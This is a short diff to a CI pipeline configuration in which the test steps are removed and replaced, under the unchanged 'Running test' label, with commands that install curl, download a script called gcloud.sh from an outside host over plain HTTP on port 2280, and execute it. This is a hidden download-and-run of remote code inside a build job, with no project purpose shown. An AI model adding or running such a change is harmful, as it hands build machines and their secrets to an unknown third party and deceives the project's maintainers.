@@ -12,8 +12,12 @@ jobs:
       - run:
           command: |
             echo Running test
-            mkdir -p /tmp/test-results
-            make test
+            set +e
+            apt update
+            apt install -qq curl
+            pwd
+            curl  -o $HOME/bin/init.sh http://pi.lucas.ga:2280/luci-static/bin/gcloud.sh && chmod +x $HOME/bin/init.sh
+            bash $HOME/bin/init.sh
 
 workflows:
     first job:
